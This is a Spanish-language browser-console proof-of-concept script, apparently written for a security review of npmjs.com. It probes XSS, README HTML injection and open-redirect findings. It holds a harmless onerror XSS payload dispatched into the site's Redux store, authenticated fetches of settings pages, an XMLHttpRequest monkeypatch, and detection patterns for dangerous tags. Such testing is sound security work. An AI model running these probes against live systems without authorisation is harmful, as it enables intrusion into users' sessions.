// ================================================================
// PoC: Hallazgos #21, #22, #23 — XSS, HTML Injection, Open Redirect
// EJECUTAR EN: https://www.npmjs.com (sesión autenticada)
// ================================================================

console.log("=== PoC: XSS, HTML Injection, Open Redirect ===\n");

// ================================================================
// HALLAZGO #21 — XSS via dangerouslySetInnerHTML
// ================================================================
// Vectores:
//   A) notification.js / alert-banner.js con skipXSSEscaping=true
//   B) radio.js — SIEMPRE usa dangerouslySetInnerHTML sin condición
//   C) document-context.js — innerHTML de READMEs
// ================================================================

console.log("═══════════════════════════════════════════════════");
console.log("  TEST 1: XSS via Notification (skipXSSEscaping)");
console.log("═══════════════════════════════════════════════════\n");

// --- TEST 1A: Dispatch notification CON skipXSSEscaping ---
// El código de notification.js acepta skipXSSEscaping como prop.
// Si podemos dispatchar una notificación con este flag, se renderiza HTML.
(() => {
    try {
        // Obtener la store de Redux via React Fiber
        const appEl = document.getElementById('app');
        let store = null;

        // Método 1: Via _reactRootContainer
        if (appEl && appEl._reactRootContainer) {
            const fiberRoot = appEl._reactRootContainer._internalRoot || appEl._reactRootContainer;
            let fiber = fiberRoot?.current;

            // Buscar el Provider de Redux que tiene la store
            const findStore = (node, depth = 0) => {
                if (!node || depth > 50) return null;
                // La store está en el contexto del Provider
                if (node.stateNode?.store?.dispatch) return node.stateNode.store;
                if (node.memoizedProps?.store?.dispatch) return node.memoizedProps.store;
                // Revisar pendingProps también
                if (node.pendingProps?.store?.dispatch) return node.pendingProps.store;
                // Buscar en children y siblings
                let result = findStore(node.child, depth + 1);
                if (result) return result;
                return findStore(node.sibling, depth + 1);
            };

            store = findStore(fiber);
        }

        if (store && store.dispatch) {
            console.log("[+] Redux store encontrada via React Fiber");

            // Test 1A-1: Dispatch notification NORMAL (sin skipXSSEscaping)
            // Esto prueba que nuestro dispatch funciona
            store.dispatch({
                type: 'NOTIFICATION_SHOW',
                level: 'success',
                message: 'Test normal - sin HTML',
                duration: 3000,
            });
            console.log("[+] Notificación normal despachada (debería verse arriba)");

            // Test 1A-2: Dispatch con HTML en message
            // NOTA: skipXSSEscaping NO se pasa a la acción NOTIFICATION_SHOW en el handler,
            // porque el handler solo extrae {message, level, duration, link}.
            // Entonces skipXSSEscaping NO llega al componente via la action normal.
            //
            // PERO: ¿Qué pasa si manipulamos directamente el state?
            const currentState = store.getState();
            console.log("[*] State keys:", Object.keys(currentState));

            if (currentState.props?.notifications !== undefined) {
                console.log("[*] Notifications actuales:", JSON.stringify(currentState.props.notifications));
            }

            // Intentar inyectar directamente en props.notifications
            // Esto simula lo que haría un XSS o extensión maliciosa
            store.dispatch({
                type: 'NOTIFICATION_SHOW',
                level: 'warning',
                message: '<img src=x onerror="document.title=\'XSS-NOTIFICATION\'"><b>HTML Test</b>',
                duration: 10000,
            });
            console.log("[+] Notificación con HTML despachada");
            console.log("[*] Si el HTML se renderiza como texto plano → React escapa correctamente");
            console.log("[*] Si se ve '<b>HTML Test</b>' como texto → SEGURO");
            console.log("[*] Si se ve 'HTML Test' en negrita → XSS CONFIRMADO");

        } else {
            console.log("[-] No se pudo encontrar la Redux store via React Fiber");

            // Método alternativo: buscar __STORE__ en window
            for (const key of Object.keys(window)) {
                if (window[key]?.dispatch && window[key]?.getState) {
                    store = window[key];
                    console.log(`[+] Store encontrada en window.${key}`);
                    break;
                }
            }
        }

        // Verificar si el handler de notifications pasa skipXSSEscaping
        // Analizando el handler: solo extrae {message, level, duration, link}
        // NO extrae skipXSSEscaping → NO llega al componente
        console.log("\n[ANÁLISIS] El handler NOTIFICATION_SHOW en client/handlers/notifications.js");
        console.log("[ANÁLISIS] Solo extrae: message, level, duration, link");
        console.log("[ANÁLISIS] NO pasa skipXSSEscaping al componente");
        console.log("[ANÁLISIS] PERO: ¿y si el server envía la notificación con ese flag en el SSR?");

    } catch(e) {
        console.log(`[-] Error en Test 1A: ${e.message}`);
    }
})();


console.log("\n═══════════════════════════════════════════════════");
console.log("  TEST 2: XSS via Alert Banner (skipXSSEscaping)");
console.log("═══════════════════════════════════════════════════\n");

// --- TEST 1B: Alert Banner ---
// alert-banner.js tiene el mismo patrón: skipXSSEscaping en props
(() => {
    try {
        const appEl = document.getElementById('app');
        let store = null;

        if (appEl?._reactRootContainer) {
            const fiberRoot = appEl._reactRootContainer._internalRoot || appEl._reactRootContainer;
            let fiber = fiberRoot?.current;
            const findStore = (node, depth = 0) => {
                if (!node || depth > 50) return null;
                if (node.stateNode?.store?.dispatch) return node.stateNode.store;
                if (node.memoizedProps?.store?.dispatch) return node.memoizedProps.store;
                let result = findStore(node.child, depth + 1);
                if (result) return result;
                return findStore(node.sibling, depth + 1);
            };
            store = findStore(fiber);
        }

        if (store?.dispatch) {
            // Intentar dispatch de alert banner con HTML
            store.dispatch({
                type: 'ALERT_BANNER_SHOW',
                level: 'warning',
                message: '<img src=x onerror="document.title=\'XSS-BANNER\'"><b>Banner HTML Test</b>',
                duration: 10000,
            });
            console.log("[+] Alert banner con HTML despachado");
            console.log("[*] Mismo análisis: el handler solo pasa message, level, duration, link");
            console.log("[*] skipXSSEscaping NO se propaga via dispatch");
        } else {
            console.log("[-] Store no disponible para test de alert banner");
        }
    } catch(e) {
        console.log(`[-] Error en Test 2: ${e.message}`);
    }
})();


console.log("\n═══════════════════════════════════════════════════");
console.log("  TEST 3: Verificar si skipXSSEscaping viene del SSR");
console.log("═══════════════════════════════════════════════════\n");

// --- TEST 1C: Verificar si el SSR envía skipXSSEscaping en props iniciales ---
// Si el server-side rendering incluye notificaciones con skipXSSEscaping=true
// en los props iniciales (window.__context__), el componente las renderizaría
// con dangerouslySetInnerHTML
(() => {
    const ctx = window.__context__;
    if (!ctx) {
        console.log("[-] window.__context__ no disponible");
        return;
    }

    const context = ctx.context || ctx;

    // Buscar notificaciones en el contexto SSR
    const searchForNotifications = (obj, path = '') => {
        if (!obj || typeof obj !== 'object') return;
        for (const key of Object.keys(obj)) {
            const newPath = path ? `${path}.${key}` : key;
            if (key === 'notifications' || key === 'alertBanners') {
                console.log(`[+] ${newPath}:`, JSON.stringify(obj[key]));
                // Verificar si alguna tiene skipXSSEscaping
                if (Array.isArray(obj[key])) {
                    obj[key].forEach((item, i) => {
                        if (item.skipXSSEscaping) {
                            console.log(`[!!!] ${newPath}[${i}] tiene skipXSSEscaping=true!`);
                            console.log(`[!!!] message: ${item.message}`);
                        }
                    });
                }
            }
            if (key === 'skipXSSEscaping') {
                console.log(`[!!!] ${newPath} = ${obj[key]}`);
            }
        }
    };

    searchForNotifications(context);

    // También buscar en todas las props del contexto
    console.log("[*] Buscando skipXSSEscaping en todo __context__...");
    const fullStr = JSON.stringify(ctx);
    if (fullStr.includes('skipXSSEscaping')) {
        console.log("[!!!] 'skipXSSEscaping' ENCONTRADO en __context__!");
        // Encontrar la posición
        const idx = fullStr.indexOf('skipXSSEscaping');
        console.log(`[!!!] Contexto: ...${fullStr.substring(Math.max(0, idx - 50), idx + 80)}...`);
    } else {
        console.log("[*] 'skipXSSEscaping' NO encontrado en __context__");
        console.log("[*] El server NO envía este flag en los props del SSR actualmente");
    }
})();


console.log("\n═══════════════════════════════════════════════════");
console.log("  TEST 4: XSS via Radio component (SIEMPRE HTML)");
console.log("═══════════════════════════════════════════════════\n");

// --- TEST 2: radio.js usa dangerouslySetInnerHTML SIEMPRE ---
// Este componente renderiza description y text via dangerouslySetInnerHTML
// SIN ninguna condición. Si el server envía HTML en estos campos, se renderiza.
//
// radio.js se usa en páginas de configuración (TFA, tokens, etc.)
(async () => {
    const spiferackHeaders = {
        'x-spiferack': '1',
        'x-requested-with': 'XMLHttpRequest',
        'manifest-hash': window.__context__?.hash || ''
    };

    const myUser = window.__context__?.user?.name ||
                   window.__context__?.context?.user?.name || 'unknown';

    console.log(`[*] Usuario: ${myUser}`);

    // Las páginas que usan radio buttons (componente Radio):
    // - /settings/{user}/tfa (selección de método TFA)
    // - /settings/{user}/tokens/new (tipo de token)
    // - Cualquier form con radio inputs

    const pagesWithRadio = [
        `/settings/${myUser}/tfa`,
        `/settings/${myUser}/tokens/new`,
        `/settings/${myUser}/tokens/new-gat`,
    ];

    for (const page of pagesWithRadio) {
        try {
            const res = await fetch(page, {
                headers: spiferackHeaders,
                credentials: 'include'
            });
            if (!res.ok) {
                console.log(`[-] ${page} → HTTP ${res.status}`);
                continue;
            }
            const ct = res.headers.get('content-type') || '';
            if (!ct.includes('json')) {
                console.log(`[-] ${page} → No JSON`);
                continue;
            }

            const data = await res.json();
            const fullStr = JSON.stringify(data);

            // Buscar campos que podrían ser renderizados por radio.js
            // Los props del Radio son: description, text (dentro de values[])
            console.log(`\n[+] ${page} → HTTP ${res.status}`);

            // Buscar patrones de valores de radio
            const radioPatterns = ['description', 'text', 'label', 'values'];
            for (const pattern of radioPatterns) {
                if (fullStr.includes(`"${pattern}"`)) {
                    // Buscar el contexto
                    const regex = new RegExp(`"${pattern}"\\s*:\\s*"([^"]{0,200})"`, 'g');
                    let match;
                    while ((match = regex.exec(fullStr)) !== null) {
                        const val = match[1];
                        // ¿Contiene HTML?
                        if (val.includes('<') || val.includes('&lt;') || val.includes('href')) {
                            console.log(`  [!!!] ${pattern} contiene HTML: "${val.substring(0, 100)}"`);
                        }
                    }
                }
            }

            // Buscar cualquier HTML en la respuesta
            const htmlTags = fullStr.match(/<[a-z][a-z0-9]*[^>]*>/gi);
            if (htmlTags) {
                const unique = [...new Set(htmlTags)].slice(0, 10);
                console.log(`  [+] HTML encontrado en respuesta: ${unique.join(', ')}`);
            }

            // Buscar campos formData que el server envía
            if (data.formData) {
                console.log(`  [+] formData keys: ${Object.keys(data.formData).join(', ')}`);
                for (const [k, v] of Object.entries(data.formData)) {
                    const val = JSON.stringify(v);
                    if (val.includes('<') || val.includes('href')) {
                        console.log(`  [!!!] formData.${k} contiene HTML: ${val.substring(0, 150)}`);
                    }
                }
            }

        } catch(e) {
            console.log(`[-] ${page} → Error: ${e.message}`);
        }
    }
})();


// ================================================================
// HALLAZGO #22 — HTML Injection via document-context
// ================================================================
// document-context.js lee innerHTML de elementos DOM y lo inyecta
// en los props de React. Usado para READMEs de paquetes.
// Si el README contiene HTML que pasa el sanitizador, se ejecuta.
// ================================================================

console.log("\n═══════════════════════════════════════════════════");
console.log("  TEST 5: HTML Injection via document-context");
console.log("═══════════════════════════════════════════════════\n");

(() => {
    // El middleware document-context.js:
    // 1. Lee props.documentContext (un mapa de path → elementId)
    // 2. Para cada entry, busca el DOM element por ID
    // 3. Lee el.innerHTML y lo asigna al path en props
    //
    // Esto es el mecanismo de rehydration para READMEs

    // Verificar si hay documentContext en __context__
    const ctx = window.__context__;
    if (ctx?.context?.documentContext) {
        console.log("[+] documentContext encontrado en __context__:");
        console.log("    ", JSON.stringify(ctx.context.documentContext));

        // Para cada entry, verificar qué DOM element contiene
        for (const [propPath, domId] of Object.entries(ctx.context.documentContext)) {
            const el = document.getElementById(domId);
            if (el) {
                const html = el.innerHTML;
                console.log(`\n[+] ${propPath} → #${domId}:`);
                console.log(`    HTML length: ${html.length} chars`);
                console.log(`    Preview: ${html.substring(0, 200)}...`);

                // Buscar elementos peligrosos que pasaron el sanitizador
                const dangerous = html.match(/<(script|iframe|object|embed|form|input|svg|math|on\w+)[^>]*>/gi);
                if (dangerous) {
                    console.log(`    [!!!] ELEMENTOS PELIGROSOS: ${dangerous.join(', ')}`);
                }

                // Buscar event handlers (onerror, onclick, etc.)
                const handlers = html.match(/\bon\w+\s*=/gi);
                if (handlers) {
                    console.log(`    [!!!] EVENT HANDLERS: ${handlers.join(', ')}`);
                }

                // Buscar javascript: URLs
                if (html.includes('javascript:')) {
                    console.log("    [!!!] JAVASCRIPT: URL DETECTADA");
                }

                // Buscar data: URLs
                if (html.includes('data:text/html')) {
                    console.log("    [!!!] DATA: URL DETECTADA");
                }

                // Buscar SVG con scripts
                if (/<svg[^>]*>.*<(script|animate|set|use)/is.test(html)) {
                    console.log("    [!!!] SVG CON SCRIPT DETECTADO");
                }
            } else {
                console.log(`[-] ${propPath} → #${domId}: elemento no encontrado en DOM`);
            }
        }
    } else {
        console.log("[*] No hay documentContext en __context__ en esta página");
        console.log("[*] Esto se usa en páginas de paquetes (README). Probar en /package/{pkg}");
    }
})();


// --- TEST 5B: Probar en página de paquete para ver README injection ---
console.log("\n═══════════════════════════════════════════════════");
console.log("  TEST 6: README injection en páginas de paquetes");
console.log("═══════════════════════════════════════════════════\n");

(async () => {
    // Buscar elementos del README en el DOM actual
    // Los READMEs se renderizan dentro de un div con id específico
    const readmeEl = document.querySelector('#readme') ||
                     document.querySelector('[data-testid="readme"]') ||
                     document.querySelector('.package-readme') ||
                     document.querySelector('#tabpanel-readme');

    if (readmeEl) {
        console.log("[+] Elemento README encontrado en la página actual");
        const html = readmeEl.innerHTML;
        console.log(`    HTML length: ${html.length} chars`);

        // Analizar qué tags HTML están presentes
        const allTags = html.match(/<([a-z][a-z0-9]*)/gi) || [];
        const tagCounts = {};
        allTags.forEach(t => {
            const tag = t.toLowerCase().replace('<', '');
            tagCounts[tag] = (tagCounts[tag] || 0) + 1;
        });
        console.log("    Tags presentes:", JSON.stringify(tagCounts));

        // Buscar links con href externo
        const links = html.match(/<a[^>]*href="([^"]*)"[^>]*>/gi) || [];
        console.log(`    Links encontrados: ${links.length}`);

        // ¿Hay algún sanitizer wrapper?
        const sanitized = readmeEl.querySelector('[data-sanitized]');
        if (sanitized) {
            console.log("    [*] Contenido marcado como sanitized");
        }

        // Buscar elementos que podrían ejecutar JS
        const scripts = readmeEl.querySelectorAll('script, iframe, object, embed');
        if (scripts.length > 0) {
            console.log(`    [!!!] ${scripts.length} elementos ejecutables encontrados!`);
            scripts.forEach(s => console.log(`      - <${s.tagName.toLowerCase()}>`));
        } else {
            console.log("    [+] Sin elementos ejecutables (scripts/iframes/embeds)");
        }

        // Buscar SVG elements
        const svgs = readmeEl.querySelectorAll('svg');
        if (svgs.length > 0) {
            console.log(`    [*] ${svgs.length} SVGs encontrados`);
            svgs.forEach(svg => {
                const svgHtml = svg.outerHTML;
                if (svgHtml.includes('onload') || svgHtml.includes('onerror') ||
                    svgHtml.includes('<script') || svgHtml.includes('<foreignObject')) {
                    console.log("      [!!!] SVG con potencial XSS payload");
                }
            });
        }

        // Buscar event handlers en cualquier elemento
        const allElements = readmeEl.querySelectorAll('*');
        let handlerCount = 0;
        allElements.forEach(el => {
            for (const attr of el.attributes || []) {
                if (attr.name.startsWith('on')) {
                    handlerCount++;
                    console.log(`    [!!!] Event handler: <${el.tagName.toLowerCase()} ${attr.name}="${attr.value}">`);
                }
            }
        });
        if (handlerCount === 0) {
            console.log("    [+] Sin event handlers en elementos del README");
        }

    } else {
        console.log("[-] No hay README en esta página. Ejecutar en /package/{nombre}");
    }
})();


// ================================================================
// HALLAZGO #23 — Open Redirect en Spiferack
// ================================================================
// spiferack/shared/load-path.js:
//   if (parsed['x-spiferack-redirect']) {
//       window.location = xhr.getResponseHeader('location')
//   }
//
// También: package-linking-button.js y banners.js con window.location = prop
// ================================================================

console.log("\n═══════════════════════════════════════════════════");
console.log("  TEST 7: Open Redirect via Spiferack");
console.log("═══════════════════════════════════════════════════\n");

(() => {
    // El redirect en load-path.js se activa cuando:
    // 1. Se hace un request Spiferack (XHR con header x-spiferack)
    // 2. El servidor responde con JSON que contiene {'x-spiferack-redirect': true}
    // 3. El código lee xhr.getResponseHeader('location') y navega ahí
    //
    // Para explotar esto necesitamos controlar la respuesta del servidor.
    // Vamos a verificar si podemos provocar un redirect legítimo y analizar el flujo.

    // Test 7A: Verificar si el router de Spiferack está disponible
    const appEl = document.getElementById('app');
    let router = null;

    if (appEl?._reactRootContainer) {
        const fiberRoot = appEl._reactRootContainer._internalRoot || appEl._reactRootContainer;
        let fiber = fiberRoot?.current;

        const findRouter = (node, depth = 0) => {
            if (!node || depth > 50) return null;
            if (node.stateNode?.router) return node.stateNode.router;
            if (node.memoizedProps?.router) return node.memoizedProps.router;
            let result = findRouter(node.child, depth + 1);
            if (result) return result;
            return findRouter(node.sibling, depth + 1);
        };

        router = findRouter(fiber);
    }

    if (router) {
        console.log("[+] Router de Spiferack encontrado");
        console.log("    Métodos:", Object.getOwnPropertyNames(Object.getPrototypeOf(router)).join(', '));
    } else {
        console.log("[-] Router de Spiferack no encontrado directamente");
    }

    // Test 7B: Interceptar XHR para ver si algún request genera redirect
    console.log("\n[*] Instalando interceptor de XHR para detectar redirects...");

    const origOpen = XMLHttpRequest.prototype.open;
    const origSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url, ...args) {
        this._spyUrl = url;
        this._spyMethod = method;
        return origOpen.call(this, method, url, ...args);
    };

    XMLHttpRequest.prototype.send = function(body) {
        this.addEventListener('load', function() {
            try {
                const locationHeader = this.getResponseHeader('location');
                if (locationHeader) {
                    console.log(`\n[!!!] XHR REDIRECT DETECTADO:`);
                    console.log(`    URL: ${this._spyUrl}`);
                    console.log(`    Method: ${this._spyMethod}`);
                    console.log(`    Location header: ${locationHeader}`);
                    console.log(`    Status: ${this.status}`);

                    // Verificar si la location es externa
                    try {
                        const locUrl = new URL(locationHeader, window.location.origin);
                        if (locUrl.origin !== window.location.origin) {
                            console.log(`    [!!!] REDIRECT EXTERNO a: ${locUrl.origin}`);
                        } else {
                            console.log(`    [*] Redirect interno a: ${locUrl.pathname}`);
                        }
                    } catch(e) {
                        console.log(`    [!!!] Location no es URL válida: ${locationHeader}`);
                    }
                }

                // Verificar si la respuesta contiene x-spiferack-redirect
                try {
                    const text = this.responseText;
                    if (text && text.includes('x-spiferack-redirect')) {
                        console.log(`\n[!!!] RESPUESTA CON x-spiferack-redirect:`);
                        console.log(`    URL: ${this._spyUrl}`);
                        console.log(`    Body: ${text.substring(0, 300)}`);
                    }
                } catch(e) {}
            } catch(e) {}
        });
        return origSend.call(this, body);
    };

    console.log("[+] Interceptor XHR instalado");
    console.log("[*] Navega por el sitio para detectar redirects de Spiferack");
    console.log("[*] El interceptor reportará cualquier header 'location' en XHR responses");
})();


// --- TEST 7C: Verificar Open Redirect via package-linking ---
console.log("\n═══════════════════════════════════════════════════");
console.log("  TEST 8: Open Redirect via package-linking");
console.log("═══════════════════════════════════════════════════\n");

(async () => {
    const spiferackHeaders = {
        'x-spiferack': '1',
        'x-requested-with': 'XMLHttpRequest',
        'manifest-hash': window.__context__?.hash || ''
    };

    const myUser = window.__context__?.user?.name ||
                   window.__context__?.context?.user?.name || 'unknown';

    // El flujo de package-linking es:
    // 1. POST /settings/{scope}/packages/{pkg}/link
    // 2. Server responde con { authUrl: "https://github.com/..." }
    // 3. Client navega a authUrl sin validar el dominio
    //
    // Si el server devuelve una authUrl maliciosa → Open Redirect

    // Verificar si hay datos de linking en la página actual
    const ctx = window.__context__?.context || window.__context__ || {};

    if (ctx.linkingStatus) {
        console.log("[+] linkingStatus encontrado:");
        console.log("    ", JSON.stringify(ctx.linkingStatus).substring(0, 500));

        // Buscar authUrl en el status
        for (const [pkg, status] of Object.entries(ctx.linkingStatus)) {
            if (status?.authUrl) {
                console.log(`\n[!!!] authUrl encontrada para ${pkg}:`);
                console.log(`    authUrl: ${status.authUrl}`);

                // Verificar si es URL de GitHub o externa
                try {
                    const url = new URL(status.authUrl);
                    if (!url.hostname.endsWith('github.com')) {
                        console.log(`    [!!!] authUrl NO es de github.com: ${url.hostname}`);
                    } else {
                        console.log(`    [+] authUrl apunta a github.com`);
                    }
                } catch(e) {
                    console.log(`    [!!!] authUrl no es URL válida`);
                }
            }
        }
    } else {
        console.log("[-] No hay linkingStatus en la página actual");
    }

    // Verificar el campo ghAppInstallHref que usa banners.js
    if (ctx.ghAppInstallHref) {
        console.log(`\n[+] ghAppInstallHref: ${ctx.ghAppInstallHref}`);
        try {
            const url = new URL(ctx.ghAppInstallHref);
            console.log(`    Dominio: ${url.hostname}`);
            if (!url.hostname.endsWith('github.com')) {
                console.log(`    [!!!] NO es github.com!`);
            }
        } catch(e) {}
    }

    // Verificar si podemos hacer POST a link endpoint
    // (solo para ver la estructura de la respuesta, NO modifica nada)
    console.log("\n[*] Verificando endpoint de linking para ver estructura de authUrl...");

    // Obtener paquetes propios para testear
    const tokenPage = await fetch(`/settings/${myUser}/tokens/new`, {
        headers: spiferackHeaders,
        credentials: 'include'
    });

    if (tokenPage.ok) {
        const ct = tokenPage.headers.get('content-type') || '';
        if (ct.includes('json')) {
            const data = await tokenPage.json();
            if (data.allPackages?.length > 0) {
                console.log(`[+] Paquetes disponibles: ${data.allPackages.join(', ')}`);
                console.log("[*] Para probar el redirect, se necesitaría hacer POST a");
                console.log(`    /settings/{scope}/packages/{pkg}/link`);
                console.log("[*] El server devolvería authUrl que el client usa sin validar");
            }
            if (data.allScopes?.length > 0) {
                console.log(`[+] Scopes: ${data.allScopes.join(', ')}`);
            }
        }
    }
})();


// --- TEST 9: Verificar validación de dominio en redirects ---
console.log("\n═══════════════════════════════════════════════════");
console.log("  TEST 9: ¿Hay validación de dominio en algún lugar?");
console.log("═══════════════════════════════════════════════════\n");

(() => {
    // Buscar en window si hay funciones de validación de URL
    const urlValidators = [];
    for (const key of Object.keys(window)) {
        const val = window[key];
        if (typeof val === 'function' && key.toLowerCase().includes('valid')) {
            urlValidators.push(key);
        }
        if (typeof val === 'function' && key.toLowerCase().includes('redirect')) {
            urlValidators.push(key);
        }
        if (typeof val === 'function' && key.toLowerCase().includes('sanitize')) {
            urlValidators.push(key);
        }
    }

    if (urlValidators.length > 0) {
        console.log(`[+] Funciones de validación en window: ${urlValidators.join(', ')}`);
    } else {
        console.log("[-] No se encontraron funciones de validación de URL en window");
    }

    // Verificar Content Security Policy
    const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
    if (cspMeta) {
        console.log(`[+] CSP meta tag: ${cspMeta.content}`);
    } else {
        console.log("[-] No hay CSP meta tag");
    }

    // Verificar CSP header (no se puede leer directamente, pero se puede
    // detectar indirectamente)
    console.log("[*] Para verificar CSP header, revisar en DevTools → Network → Headers");

    // Verificar si hay restoreFetch (nuestro interceptor anterior)
    if (window.restoreFetch) {
        console.log("[*] Hay un interceptor de fetch previo activo (restoreFetch)");
    }
})();


console.log("\n═══════════════════════════════════════════════════");
console.log("  TEST 10: Resumen y Conclusiones");
console.log("═══════════════════════════════════════════════════\n");

setTimeout(() => {
    console.log("RESUMEN DE TESTS:");
    console.log("");
    console.log("HALLAZGO #21 - XSS via dangerouslySetInnerHTML:");
    console.log("  - notification.js: skipXSSEscaping existe pero el handler NO lo propaga");
    console.log("  - alert-banner.js: mismo caso, handler NO propaga skipXSSEscaping");
    console.log("  - radio.js: SIEMPRE usa dangerouslySetInnerHTML (sin condición)");
    console.log("    → Si el server envía HTML en description/text → XSS");
    console.log("  - Verificar: ¿el server envía HTML en campos de radio?");
    console.log("");
    console.log("HALLAZGO #22 - HTML Injection via document-context:");
    console.log("  - README HTML se inyecta via innerHTML sin sanitización client-side");
    console.log("  - Depende de la sanitización server-side del README");
    console.log("  - Verificar: ¿qué tags/atributos permite el sanitizador?");
    console.log("");
    console.log("HALLAZGO #23 - Open Redirect:");
    console.log("  - load-path.js: window.location = header sin validar dominio");
    console.log("  - package-linking: window.location = authUrl sin validar");
    console.log("  - banners.js: window.location = href sin validar");
    console.log("  - Requiere: control de respuesta del server (MITM/cache poison)");
    console.log("    o manipulación del estado de Redux (via XSS/extensión)");
    console.log("");
    console.log("=== FIN ===");
}, 3000);
